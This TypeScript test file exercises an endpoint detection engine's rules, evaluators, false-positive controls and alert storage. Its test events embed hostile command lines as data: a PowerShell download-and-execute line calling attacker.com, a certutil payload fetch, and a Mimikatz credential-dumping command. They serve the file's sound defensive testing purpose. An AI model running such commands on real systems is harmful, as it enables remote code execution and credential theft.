import { initDatabase, query, run } from '../backend/db/index.js';
import { 
  syncDefaultRules, 
  getRules, 
  getRuleById,
  evaluateTelemetryEvent, 
  evaluateRuleConditions, 
  ingestAndDetect,
  getAlerts,
  getAlertById
} from '../backend/detection/index.js';
import { TelemetryEvent } from '../backend/detection/types.js';

function assert(condition: boolean, message: string) {
  if (!condition) {
    console.error(`  \x1b[31m✖\x1b[0m ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  console.log(`  \x1b[32m✔\x1b[0m ${message}`);
}

async function runDetectionEngineTests() {
  console.log('\x1b[1m=== Running LocalEDR Detection Engine Tests ===\x1b[0m');

  await initDatabase();

  // Test Suite 1: Rule Ingestion from YAML & JSON
  console.log('\n\x1b[36m[Test Suite: Rule Configuration & Catalog Parsing]\x1b[0m');
  syncDefaultRules();
  const rules = getRules();
  assert(rules.length >= 8, `Loaded ${rules.length} detection rules from YAML & JSON`);

  // Verify all required rule fields exist on every rule
  for (const r of rules) {
    assert(typeof r.id === 'string' && r.id.length > 0, `Rule ${r.id} has ID`);
    assert(typeof r.name === 'string' && r.name.length > 0, `Rule ${r.id} has Name`);
    assert(typeof r.description === 'string' && r.description.length > 0, `Rule ${r.id} has Description`);
    assert(typeof r.enabled === 'boolean', `Rule ${r.id} has Enabled flag`);
    assert(['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'].includes(r.severity), `Rule ${r.id} has valid Severity: ${r.severity}`);
    assert(typeof r.score === 'number' && r.score >= 0 && r.score <= 100, `Rule ${r.id} has valid Score: ${r.score}`);
    assert(typeof r.mitre === 'object' && !!r.mitre.tactic && !!r.mitre.technique_id, `Rule ${r.id} has MITRE mapping (${r.mitre.tactic} -> ${r.mitre.technique_id})`);
    assert(typeof r.conditions === 'object', `Rule ${r.id} has Conditions`);
    assert(typeof r.recommended_action === 'string' && r.recommended_action.length > 0, `Rule ${r.id} has Recommended action`);
  }

  // Test Suite 2: Individual Condition Evaluator Checks
  console.log('\n\x1b[36m[Test Suite: Condition Type Evaluators]\x1b[0m');

  // Condition: Process Name
  const procNameMatch = evaluateRuleConditions(
    { event_type: 'process_creation', process_name: 'powershell.exe' },
    { process_name: ['powershell.exe', 'pwsh.exe'] }
  );
  assert(procNameMatch.matched === true, 'Evaluator matches process_name condition');
  assert(procNameMatch.evidence.process_name === 'powershell.exe', 'Extracts process_name evidence');

  const procNameMismatch = evaluateRuleConditions(
    { event_type: 'process_creation', process_name: 'calc.exe' },
    { process_name: ['powershell.exe', 'pwsh.exe'] }
  );
  assert(procNameMismatch.matched === false, 'Evaluator rejects non-matching process_name');

  // Condition: Parent Process
  const parentMatch = evaluateRuleConditions(
    { event_type: 'process_creation', process_name: 'cmd.exe', parent_process_name: 'chrome.exe' },
    { process_name: 'cmd.exe', parent_process: ['chrome.exe', 'msedge.exe'] }
  );
  assert(parentMatch.matched === true, 'Evaluator matches parent_process condition');
  assert(parentMatch.evidence.parent_process?.includes('chrome.exe') === true, 'Extracts parent_process evidence');

  // Condition: Command Line
  const cmdMatch = evaluateRuleConditions(
    { event_type: 'process_creation', process_name: 'powershell.exe', command_line: 'powershell.exe -enc V3JpdGU=' },
    { command_line: ['-enc', '-encodedcommand'] }
  );
  assert(cmdMatch.matched === true, 'Evaluator matches command_line substring condition');
  assert(cmdMatch.evidence.command_line?.includes('-enc') === true, 'Extracts command_line evidence');

  // Condition: Executable Path
  const pathMatch = evaluateRuleConditions(
    { event_type: 'process_creation', process_name: 'dropper.exe', image_path: 'C:\\Users\\User\\AppData\\Local\\Temp\\dropper.exe' },
    { executable_path: ['\\appdata\\local\\temp\\', '\\windows\\temp\\'] }
  );
  assert(pathMatch.matched === true, 'Evaluator matches executable_path condition');
  assert(pathMatch.evidence.executable_path?.includes('Temp') === true, 'Extracts executable_path evidence');

  // Condition: Username
  const userMatch = evaluateRuleConditions(
    { event_type: 'process_creation', process_name: 'cmd.exe', user: 'WIN-LAPTOP\\Guest' },
    { username: ['Guest', 'DefaultAccount'] }
  );
  assert(userMatch.matched === true, 'Evaluator matches username condition');
  assert(userMatch.evidence.username?.includes('Guest') === true, 'Extracts username evidence');

  // Condition: Process Relationships (is_unsigned & parent_in)
  const relMatch = evaluateRuleConditions(
    { 
      event_type: 'process_creation', 
      process_name: 'loader.exe', 
      signature_status: 'Unsigned', 
      parent_process_name: 'powershell.exe' 
    },
    { 
      process_relationships: { 
        is_unsigned: true, 
        parent_in: ['powershell.exe', 'cmd.exe'] 
      } 
    }
  );
  assert(relMatch.matched === true, 'Evaluator matches process_relationships condition');
  assert(relMatch.evidence.process_relationships?.includes('unsigned') === true, 'Extracts relationship evidence');

  // Test Suite 3: Example Detections from Brief
  console.log('\n\x1b[36m[Test Suite: Required Example Detections]\x1b[0m');

  // Detection 1: PowerShell spawned by Microsoft Office
  const officePsEvent: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'powershell.exe',
    parent_process_name: 'winword.exe',
    parent_process_id: 5120,
    command_line: 'powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/p\')"',
    user: 'CORP\\VictimUser',
    image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
  };
  const officePsRes = ingestAndDetect(officePsEvent);
  assert(officePsRes.alertsGenerated.length >= 1, 'Detected PowerShell spawned by Microsoft Office');
  const officeAlert = officePsRes.alertsGenerated.find(a => a.rule_id === 'EDR-001-OFFICE-POWERSHELL');
  assert(officeAlert !== undefined, 'Triggered rule EDR-001-OFFICE-POWERSHELL');
  assert(officeAlert?.severity === 'CRITICAL', 'Office PowerShell severity is CRITICAL');
  assert(officeAlert?.score !== undefined && officeAlert.score >= 40 && officeAlert.score <= 100, 'Office PowerShell score computed transparently (40-100)');
  assert(officeAlert?.base_score !== undefined, 'Office PowerShell alert includes base_score');
  assert(officeAlert?.risk_level !== undefined, 'Office PowerShell alert includes risk_level');
  assert(officeAlert?.mitre_technique_id === 'T1059.001', 'Office PowerShell MITRE ID is T1059.001');

  // Detection 2: cmd.exe spawned by unusual parent (browser)
  const unusualCmdEvent: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'cmd.exe',
    parent_process_name: 'chrome.exe',
    parent_process_id: 3412,
    command_line: 'cmd.exe /c whoami',
    user: 'CORP\\VictimUser',
    image_path: 'C:\\Windows\\System32\\cmd.exe'
  };
  const unusualCmdRes = ingestAndDetect(unusualCmdEvent);
  const cmdAlert = unusualCmdRes.alertsGenerated.find(a => a.rule_id === 'EDR-002-CMD-UNUSUAL-PARENT');
  assert(cmdAlert !== undefined, 'Detected cmd.exe spawned by unusual parent (chrome.exe)');
  assert(cmdAlert?.score !== undefined && cmdAlert.score > 0 && cmdAlert.score <= 100, 'cmd.exe unusual parent score is calculated');
  assert(cmdAlert?.mitre_technique_id === 'T1059.003', 'cmd.exe unusual parent MITRE ID is T1059.003');

  // Detection 3: Executable launched from temporary directory
  const tempExeEvent: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'setup_temp.exe',
    parent_process_name: 'explorer.exe',
    command_line: '"C:\\Users\\User\\AppData\\Local\\Temp\\setup_temp.exe"',
    image_path: 'C:\\Users\\User\\AppData\\Local\\Temp\\setup_temp.exe',
    user: 'WIN-LAPTOP\\User'
  };
  const tempExeRes = ingestAndDetect(tempExeEvent);
  const tempAlert = tempExeRes.alertsGenerated.find(a => a.rule_id === 'EDR-003-EXE-FROM-TEMP-DIR');
  assert(tempAlert !== undefined, 'Detected executable launched from temporary directory');
  assert(tempAlert?.score !== undefined && tempAlert.score > 0 && tempAlert.score <= 100, 'Temporary directory execution score is calculated');
  assert(tempAlert?.mitre_technique_id === 'T1027', 'Temporary directory execution MITRE ID is T1027');

  // Detection 4: Suspicious LOLBin execution (certutil download)
  const lolbinEvent: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'certutil.exe',
    parent_process_name: 'cmd.exe',
    command_line: 'certutil.exe -urlcache -split -f https://example.com/payload.exe payload.exe',
    image_path: 'C:\\Windows\\System32\\certutil.exe',
    user: 'WIN-LAPTOP\\User'
  };
  const lolbinRes = ingestAndDetect(lolbinEvent);
  const lolbinAlert = lolbinRes.alertsGenerated.find(a => a.rule_id === 'EDR-004-SUSPICIOUS-LOLBIN-EXEC');
  assert(lolbinAlert !== undefined, 'Detected suspicious LOLBin execution (certutil)');
  assert(lolbinAlert?.score !== undefined && lolbinAlert.score > 0 && lolbinAlert.score <= 100, 'LOLBin alert score is calculated');
  assert(lolbinAlert?.mitre_technique_id === 'T1218', 'LOLBin MITRE ID is T1218');

  // Detection 5: Unsigned executable with suspicious parent
  const unsignedEvent: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'beacon.exe',
    parent_process_name: 'powershell.exe',
    command_line: 'C:\\Windows\\Temp\\beacon.exe',
    signature_status: 'Unsigned',
    image_path: 'C:\\Windows\\Temp\\beacon.exe',
    user: 'WIN-LAPTOP\\User'
  };
  const unsignedRes = ingestAndDetect(unsignedEvent);
  const unsignedAlert = unsignedRes.alertsGenerated.find(a => a.rule_id === 'EDR-005-UNSIGNED-EXE-SUSPICIOUS-PARENT');
  assert(unsignedAlert !== undefined, 'Detected unsigned executable spawned by script interpreter');
  assert(unsignedAlert?.score !== undefined && unsignedAlert.score > 0 && unsignedAlert.score <= 100, 'Unsigned executable score is calculated');
  assert(unsignedAlert?.mitre_technique_id === 'T1036', 'Unsigned executable MITRE ID is T1036');

  // Detection 6: Known malicious hash match
  // Ensure a test IoC exists in threat_intel
  const testHash = 'a3f12e8964724896e00b84c8a245f8e582d92d8f9cbe878b274c3e8ff17865c3';
  run(
    'INSERT OR IGNORE INTO threat_intel (type, value, description, threat_actor, severity, confidence, added_at) VALUES (?, ?, ?, ?, ?, ?, ?)',
    ['sha256', testHash, 'Mimikatz Credential Dumper Tool', 'APT28', 'CRITICAL', 100, new Date().toISOString()]
  );

  const hashEvent: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'custom_mimi.exe',
    parent_process_name: 'cmd.exe',
    command_line: 'custom_mimi.exe sekurlsa::logonpasswords',
    file_hash: testHash,
    user: 'WIN-LAPTOP\\Administrator'
  };
  const hashRes = ingestAndDetect(hashEvent);
  const hashAlert = hashRes.alertsGenerated.find(a => a.rule_id === 'EDR-006-KNOWN-MALICIOUS-HASH');
  assert(hashAlert !== undefined, 'Detected process matching known malicious hash IoC');
  assert(hashAlert?.score === 100, 'Malicious hash score is 100 (Clamped maximum)');
  assert(hashAlert?.risk_level === 'Critical', 'Malicious hash risk level is Critical');
  assert(hashAlert?.severity === 'CRITICAL', 'Malicious hash severity is CRITICAL');

  // Test Suite 4: Non-Malicious / Benign Behavior
  console.log('\n\x1b[36m[Test Suite: False Positive Control & Selective Alerting]\x1b[0m');

  // Benign event: standard notepad launched from explorer
  const benignNotepad: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'notepad.exe',
    parent_process_name: 'explorer.exe',
    command_line: '"C:\\Windows\\System32\\notepad.exe" "C:\\Users\\User\\Desktop\\notes.txt"',
    image_path: 'C:\\Windows\\System32\\notepad.exe',
    signature_status: 'Valid',
    user: 'WIN-LAPTOP\\User'
  };
  const benignRes = ingestAndDetect(benignNotepad);
  assert(benignRes.alertsGenerated.length === 0, 'Benign notepad execution generates ZERO alerts');

  // Benign PowerShell: standard administrative execution not matching Office parent
  const benignPs: TelemetryEvent = {
    event_type: 'process_creation',
    process_name: 'powershell.exe',
    parent_process_name: 'explorer.exe',
    command_line: 'powershell.exe Get-Process',
    user: 'WIN-LAPTOP\\User',
    image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
  };
  const benignPsRes = ingestAndDetect(benignPs);
  assert(
    !benignPsRes.alertsGenerated.some(a => a.rule_id === 'EDR-001-OFFICE-POWERSHELL'),
    'Standard PowerShell does NOT false-positive on Office-PowerShell rule'
  );

  // Test Suite 5: Alert Explanation Completeness
  console.log('\n\x1b[36m[Test Suite: Alert Explanation & Forensic Evidence Completeness]\x1b[0m');
  assert(officeAlert !== undefined, 'Reference alert exists');
  if (officeAlert) {
    // 1. WHY it triggered
    assert(officeAlert.why_triggered.length > 20, 'Alert explains WHY it triggered');
    assert(officeAlert.why_triggered.includes('triggered because:'), 'Contains causal reason');

    // 2. WHICH rule triggered
    assert(officeAlert.rule_id === 'EDR-001-OFFICE-POWERSHELL', 'Alert indicates WHICH rule ID triggered');
    assert(officeAlert.rule_name.includes('PowerShell Spawned by Microsoft Office'), 'Alert indicates WHICH rule Name triggered');

    // 3. WHICH evidence was used
    const parsedEvidence = JSON.parse(officeAlert.evidence_json);
    assert(Array.isArray(parsedEvidence.matched_criteria), 'Evidence contains matched_criteria array');
    assert(parsedEvidence.matched_criteria.length >= 2, 'Evidence details both process and parent criteria');
    assert(parsedEvidence.process_name === 'powershell.exe', 'Evidence captures process_name');
    assert(parsedEvidence.parent_process.includes('winword.exe'), 'Evidence captures parent_process');

    // 4. MITRE mapping
    assert(officeAlert.mitre_tactic === 'Execution', 'Alert includes MITRE tactic');
    assert(officeAlert.mitre_technique_id === 'T1059.001', 'Alert includes MITRE technique ID');
    assert(officeAlert.mitre_technique_name.includes('PowerShell'), 'Alert includes MITRE technique name');

    // 5. Risk score & transparent calculation
    assert(typeof officeAlert.score === 'number' && officeAlert.score > 0 && officeAlert.score <= 100, 'Alert includes accurate risk score (<= 100)');
    assert(typeof officeAlert.base_score === 'number', 'Alert includes base score');
    assert(typeof officeAlert.risk_level === 'string', 'Alert includes risk level');

    // 6. Recommended Action
    assert(officeAlert.recommended_action.length > 20, 'Alert includes actionable remediation guidance');
  }

  // Test Suite 6: SQLite Persistence and API Queries
  console.log('\n\x1b[36m[Test Suite: Alert SQLite Persistence & Query APIs]\x1b[0m');
  const storedAlerts = getAlerts();
  assert(storedAlerts.length >= 6, `Retrieved ${storedAlerts.length} stored alerts from SQLite`);

  // Query filter: by severity
  const critAlerts = getAlerts({ severity: 'CRITICAL' });
  assert(critAlerts.length > 0 && critAlerts.every(a => a.severity === 'CRITICAL'), 'Filtered alerts by CRITICAL severity');

  // Query filter: by min_score
  const highScoreAlerts = getAlerts({ min_score: 50 });
  assert(highScoreAlerts.length > 0 && highScoreAlerts.every(a => a.score >= 50), 'Filtered alerts by min_score >= 50');

  // Query filter: by rule_id
  const ruleFilteredAlerts = getAlerts({ rule_id: 'EDR-001-OFFICE-POWERSHELL' });
  assert(ruleFilteredAlerts.length > 0 && ruleFilteredAlerts.every(a => a.rule_id === 'EDR-001-OFFICE-POWERSHELL'), 'Filtered alerts by rule_id');

  // Query single alert by ID
  const firstAlertId = storedAlerts[0].id;
  const singleAlert = getAlertById(firstAlertId);
  assert(singleAlert !== null, 'Retrieved alert by ID');
  assert(singleAlert?.alert.id === firstAlertId, 'Retrieved alert ID matches');
  assert(singleAlert?.rule !== null, 'Retrieved alert has correlated rule definition');

  console.log('\n\x1b[1;32m✔ All Detection Engine Tests Passed Successfully!\x1b[0m\n');
}

runDetectionEngineTests().catch(err => {
  console.error('\n\x1b[1;31m✖ Detection Engine Tests Failed:\x1b[0m', err);
  process.exit(1);
});
